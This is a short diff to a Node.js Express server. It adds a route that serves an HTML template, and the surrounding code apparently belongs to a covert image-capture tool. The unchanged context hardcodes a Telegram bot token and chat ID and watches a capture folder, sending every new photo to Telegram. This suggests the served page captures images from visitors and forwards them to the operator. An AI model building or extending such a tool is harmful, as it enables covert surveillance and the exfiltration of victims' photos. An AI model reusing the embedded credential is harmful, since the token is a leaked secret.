@@ -8,6 +8,9 @@ const chokidar = require("chokidar");
 const app = express();
 const PORT = 3000;
 
+const templatesDir = path.join(__dirname, "templates");
+const indexPath = path.join(templatesDir, "index.html");
+
 // === Telegram Bot Config ===
 const telegramToken = '7970078573:AAEzOuBKiLnA8jDnKNzwKFZdRbSZzPNo2KA';
 const chatId = '7041065272';
@@ -43,6 +46,16 @@ chokidar.watch(captureDir).on("add", (filePath) => {
         console.log(`[+] New file detected: ${filePath}`);
         sendPhotoToTelegram(filePath);
     }
+});
+
+app.get("/", (req, res) => {
+    fs.readFile(indexPath, 'utf8', (err, html) => {
+        if (err) {
+            console.error("Error reading HTML file:", err);
+            return res.sendStatus(500);
+        }
+        res.send(html);
+    });
 });
 
 // Handle image capture
